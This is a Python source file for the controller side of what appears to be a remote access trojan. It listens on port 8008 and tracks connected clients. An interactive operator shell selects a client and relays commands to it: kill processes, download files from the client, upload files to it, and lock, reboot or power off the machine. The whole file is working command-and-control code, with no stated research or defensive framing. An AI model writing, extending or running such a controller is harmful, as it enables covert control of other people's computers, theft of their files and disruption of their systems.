import socket, gc, struct
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global host
        global port
        global s
        host = "0.0.0.0"
        port = 8008
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept() 
            all_connections.append(conn)
            all_address.append(address)
        except:
            print("Error accepting connections")

def start_turtle():

    while True:
        cmd = input("Enter 'list' to show connections or 'select <number>' eg 'select 0' to interact with a client: ")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                print('\n')
                handleClient(conn)
        elif cmd == 'quit':
            conn.close()
        else:
            print("Command not recognized")

def list_connections():
    for i, conn in enumerate(all_connections):
        print(f"{i}   {conn.getpeername()[0]}   ")

def get_target(cmd):
    try:
        target = cmd.replace('select ', '') 
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not valid")
        return None

def bannerPW():
    print ("""
        0       lock workstation
        1       lock off
        2       reboot
        3       shut down
        4       power off
    """)

#RECEIVE FILE FROM CLIENT 
def receiveFile(conn, filePath):
    with open(filePath, "wb+") as file:
        # Receive the file size from the client
        fileSizeData = conn.recv(4)
        size = struct.unpack('!I', fileSizeData)[0]
        print("Size file receive ", +size)

        # Receive the data file
        received = 0
        while received < size:
            data = conn.recv(8096)
            file.write(data)
            received += len(data)
        del data
        del fileSizeData
        received = 0
        gc.collect()
        file.close()
        print("File received successfully.")

#SEND FILE TO CLIENT
def sendFile(conn, filePath):
    with open(filePath, 'rb') as file:
        # send size file to client
        file_data = file.read()
        file_size = len(file_data)
        conn.sendall(file_size.to_bytes(4, byteorder='big'))
        
        # send data file to client
        chunk_size = 8096
        offset = 0
        while offset < file_size:
            chunk = file_data[offset:offset + chunk_size]
            conn.sendall(chunk)
            offset += chunk_size
        
        file.close()
        print("File uploaded successfully")

def handleClient(conn):
    try:
        while True:
            data = conn.recv(8096).decode('utf-8', errors='replace')
            print(data)

            cmd = input(f'{conn.getpeername()[0]}> ').upper()
            conn.send(cmd.encode('utf-8', errors='replace'))

            if cmd == "KPC":
                pid = input("Enter PID of process to kill: ")
                conn.send(pid.encode('utf-8', errors='replace'))
            if cmd == "DF":
                filePathDown = input("Enter file path you want to download from client: ")
                conn.send(filePathDown.encode('utf-8', errors='replace'))
                filePathSave = input("Enter the file path to save: ")
                conn.send(filePathSave.encode('utf-8', errors='replace'))
                receiveFile(conn, filePathSave)
                del filePathDown
                del filePathSave
                gc.collect()
            if cmd == "UF":
                filePathUp = input("Enter file path you want to upload to client: ")
                filePathSave = input("Enter the file path to save on the client: ")
                conn.send(filePathSave.encode('utf-8', errors='replace'))
                sendFile(conn, filePathUp)
                del filePathSave
                del filePathUp
                gc.collect()
            if cmd == "EXIT":
                print("Connection closed!")
                conn.close()
                del conn
                break
            if cmd == "PW":
                bannerPW()
                buff = input("Enter a number to do something: ")
                conn.send(buff.encode('utf-8', errors='replace'))
            if cmd == "chg":
                conn.close()
                start_turtle()
    except (ConnectionResetError, ConnectionAbortedError):
        print(f"Client {conn.getpeername()[0]} disconnected unexpectedly.")

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x, True, 1.0)
    queue.join()


create_workers()
create_jobs()